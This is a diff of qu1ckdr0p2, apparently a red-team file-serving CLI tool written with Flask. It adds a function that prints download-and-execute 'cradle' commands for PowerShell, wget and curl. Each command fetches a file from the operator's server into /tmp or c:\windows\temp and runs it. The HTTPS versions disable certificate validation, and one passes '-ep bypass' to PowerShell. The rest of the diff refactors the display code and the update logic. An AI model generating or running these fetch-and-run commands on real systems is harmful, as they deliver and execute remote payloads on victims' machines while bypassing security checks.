@@ -5,8 +5,6 @@ from tqdm import tqdm
 from halo import Halo
 from OpenSSL import crypto
 import os
-import pyperclip
-
 import netifaces as ni
 import logging
 import click
@@ -15,6 +13,7 @@ import requests
 import subprocess
 import signal
 import sys
+
 
 cli = sys.modules['flask.cli']
 cli.show_server_banner = lambda *x: None
@@ -40,7 +39,6 @@ privkey = "key.pem"
 
 config = configparser.ConfigParser()
 common_ini_path = os.path.join(base_dir, 'config/common.ini')
-config = configparser.ConfigParser()
 config.read(common_ini_path)
 aliases = {}
 for section in config.sections():
@@ -133,59 +131,84 @@ def load_config(file_path):
     return aliases
 
 
+def generate_code_outputs(protocol, ip_address, port, filename):
+    code_outputs = []
+
+    if filename:
+        if protocol == 'https':
+            csharp_ignore_tls = (
+                f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates;"
+                f"public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += "
+                f"(sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; [SSLValidator]::Ignore();"
+                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); powershell -ep bypass; Start-Process 'c:\\windows\\temp\\{filename}'"
+            )
+
+            wget_ignore_tls = f"wget --no-check-certificate {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
+
+            curl_ignore_tls = f"curl -k {protocol}://{ip_address}:{port}/{filename} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
+
+            powershell_ignore_tls = ( 
+                            f"$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); Start-Process 'c:\\windows\\temp\\{filename}'"
+            )
+
+            code_outputs.extend([
+                ("csharp_ignore_tls", csharp_ignore_tls),
+                ("wget_ignore_tls", wget_ignore_tls),
+                ("curl_ignore_tls", curl_ignore_tls),
+                ("powershell_ignore_tls", powershell_ignore_tls),
+            ])
+
+        else:
+            csharp = (
+                f"$webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); Start-Process 'c:\\windows\\temp\\{filename}'"
+            )
+
+            wget = f"wget {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
+
+            curl = f"curl {protocol}://{ip_address}:{port}/{filename} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
+
+            powershell = f"Invoke-WebRequest -Uri {protocol}://{ip_address}:{port}/{filename} -OutFile c:\\windows\\temp\\{filename}; Start-Process c:\\windows\\temp\\{filename}"
+
+            code_outputs.extend([
+                ("csharp", csharp),
+                ("wget", wget),
+                ("curl", curl),
+                ("powershell", powershell),
+            ])
+        
+
+    return code_outputs
+
 def print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert=None, privkey=None):
-    while True:
-        click.clear()  
-        relative_path = os.path.relpath(path_to_serve, start=base_dir)  
-        spinner = Halo(spinner='dots', color='cyan', text_color='yellow')
+    click.clear()
+    base_dir = os.getcwd()  
+    relative_path = os.path.relpath(path_to_serve, start=base_dir)
+    
+    click.echo(click.style(f"[→] ", fg='green') + click.style("Serving:", fg='yellow') + click.style(f" {relative_path}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("Protocol:", fg='yellow') + click.style(f" {protocol}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("IP address:", fg='yellow') + click.style(f" {ip_address}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("Port:", fg='yellow') + click.style(f" {port}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("Interface:", fg='yellow') + click.style(f" {interface_name}", fg='blue'))
 
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Serving:", fg='yellow') + click.style(f" {relative_path}", fg='blue'))
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Protocol:", fg='yellow') + click.style(f" {protocol}", fg='blue'))
-        click.echo(click.style(f"[→] ", fg='green') + click.style("IP address:", fg='yellow') + click.style(f" {ip_address}", fg='blue'))
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Port:", fg='yellow') + click.style(f" {port}", fg='blue'))    
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Interface:", fg='yellow') + click.style(f" {interface_name}", fg='blue'))  
+    if cert and privkey:
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Using cert:", fg='yellow') + click.style(f" {cert}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Using key:", fg='yellow') + click.style(f" {privkey}", fg='blue'))
 
-        if cert and privkey:
-            click.echo(click.style(f"[→] ", fg='green') + click.style("Using cert:", fg='yellow') + click.style(f" {cert}", fg='blue'))
-            click.echo(click.style(f"[→] ", fg='green') + click.style("Using key:", fg='yellow') + click.style(f" {privkey}", fg='blue'))
+    click.echo(click.style(f"[→] ", fg='green') + click.style("CTRL+C to quit", fg='yellow'))
+    click.echo(click.style(f"\n[→] ", fg='green') + click.style("URL:", fg='yellow') + click.style(f" {protocol}://{ip_address}:{port}/{filename}\n", fg='blue'))
 
-        click.echo(click.style(f"[→] ", fg='green') + click.style("CTRL+C to quit", fg='yellow'))
-        click.echo(click.style(f"\n[→] ", fg='green') + click.style("URL:", fg='yellow') + click.style(f" {protocol}://{ip_address}:{port}/{filename}\n", fg='blue'))
-        powershell_code = (
-            f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates;"
-            f"public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += "
-            f"(sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; [SSLValidator]::Ignore();"
-            f" Invoke-WebRequest -Uri {protocol}://{ip_address}:{port}/{filename} -OutFile {filename}"
-        )
+    code_outputs = generate_code_outputs(protocol, ip_address, port, filename)
+    for code_type, code_output in code_outputs:
+        click.echo(click.style(f"[↓] ", fg='green') + click.style(f"{code_type}:\n", fg='yellow') + click.style(f"{code_output}\n", fg='blue'))
 
-        click.echo(
-            click.style("[→] ", fg="green")
-            + click.style("Powershell:", fg="yellow")
-            + click.style(f" {powershell_code}\n", fg="blue")
-        )
-        click.echo("Options:")
-        click.echo("1. Copy Cradle Powershell code to clipboard")
-        click.echo("2. Start the web server")
-        click.echo("3. Exit")
-        
-        choice = click.prompt("Enter your choice:", type=int)
-        
-        if choice == 1:
-            pyperclip.copy(powershell_code)
-            click.echo(click.style("[→] ", fg='green') + click.style("Cradle Powershell code copied to clipboard.", fg='blue'))
-            click.pause(info="Press any key to continue...")
-        elif choice == 2:
-            spinner.start("Web server running...")
-            break
-        elif choice == 3:
-            click.echo(click.style("Exiting...", fg='blue'))
-            break
+    spinner = Halo(spinner='dots', color='cyan', text_color='yellow')
+    spinner.start("Web server running")
 
-        
-    spinner.start("Web server running...")
 
           
 def serve_files(path_to_serve, http_port=80, https_port=443):
+    path_to_serve = os.path.abspath(path_to_serve)
+    print(path_to_serve)
     if os.path.isdir(path_to_serve):
         @app.route('/')
         def index():
@@ -246,7 +269,8 @@ def serve_files(path_to_serve, http_port=80, https_port=443):
             app.run(host='0.0.0.0', port=https_port, ssl_context=(cert_path, key_path), threaded=True)
         else:
             click.echo(click.style(f"\n[*] ", fg='red') + click.style("Could not generate or find SSL certificates.\n", fg='yellow'))
-        
+
+    
 def invoke_serve_by_number(search=None, use=None, http=None, https=None):
     search_results = {alias: path for alias, path in aliases.items() if search.lower() in alias.lower() or search.lower() in path.lower()}
     if use > len(search_results) or use < 1:
@@ -344,7 +368,8 @@ def update_self_function():
         click.echo(click.style(f"[→] ", fg='green') + click.style("Successfully updated qu1ckdr0p2\n\n", fg='blue'))
     except subprocess.CalledProcessError as e:
         click.echo(click.style(f"[*] ", fg='red') + click.style("Failed to update {e}\n\n", fg='red'))
-                
+                 
+    
 @click.group()
 @click.option('--debug', is_flag=True, help='Enable debug mode.')
 @click.pass_context
@@ -396,50 +421,36 @@ def serve(ctx, list_flag, search, use, directory, file, http, https):
         return
 
     if file:
+        file = os.path.abspath(file)  # Convert to absolute path
         if not http and not https:
             https = 443  
         serve_files(file, http, https)
-        return
+        return 
 
 @cli.command()
-@click.option('--check', is_flag=True, help='Check and download missing or outdated files.')
-@click.option('--skip-config', is_flag=True, help='Skip checking the config directory.')
-@click.option('--skip-windows', is_flag=True, help='Skip checking the windows directory.')
-@click.option('--skip-linux', is_flag=True, help='Skip checking the linux directory.')
-@click.option('--skip-mac', is_flag=True, help='Skip checking the mac directory.')
-@click.option('--api-key', help='Github API key for authentication')
+@click.option('--update', is_flag=True, help='Check and download missing tools.')
 @click.option('--update-self', is_flag=True, help='Update the tool using pip.')
 @click.option('--update-self-test', is_flag=True, help='Used for dev testing, installs unstable build.')
-def init(check, skip_config, skip_windows, skip_linux, skip_mac, api_key, update_self, update_self_test):
-    """Configure or update."""
-    if update_self:
-        subprocess.run(["pip", "install", "--upgrade", "your-package-name"])
-    elif update_self_test:
-        subprocess.run(["pip", "install", "--index-url", "https://test.pypi.org/legacy/", "--upgrade", "your-package-name-test"])
-    else:
-        create_directory(base_dir)
-    
-    skip_directories = []
-    if skip_config: skip_directories.append("config")
-    if skip_windows: skip_directories.append("windows")
-    if skip_linux: skip_directories.append("linux")
-    if skip_mac: skip_directories.append("mac")
+def init(update, update_self, update_self_test):
+    """Perform updates."""
+    if update:
+        check_and_update_tools()
 
-    all_directories = target_directories + other_directories
-    for dir_name in all_directories:
-        if dir_name in skip_directories:
-            continue
-        full_path = os.path.join(base_dir, dir_name)
-        create_directory(full_path)
-    
-    headers = {'Authorization': f'token {api_key}'} if api_key else None
-    handle_github_auth(api_key)
-    
-    for directory in target_directories:
-        if directory in skip_directories:
-            continue
-        handle_directory(directory, headers, check)
-                                            
+
+def check_and_update_tools():
+    if not os.path.exists(base_dir):
+        print(f"Directory {base_dir} does not exist. Cloning from GitHub.")
+        try:
+            subprocess.run(["git", "clone", "https://github.com/byinarie/qu1ckdr0p2-tools.git", base_dir], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error occurred: {e}")
+    else:
+        print(f"Directory {base_dir} exists. Pulling latest changes.")
+        try:
+            subprocess.run(["git", "-C", base_dir, "pull"], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error occurred: {e}")   
+                              
 if __name__ == "__main__":
     target_directory = os.path.dirname(os.path.abspath(__file__))   
     cli(obj={})
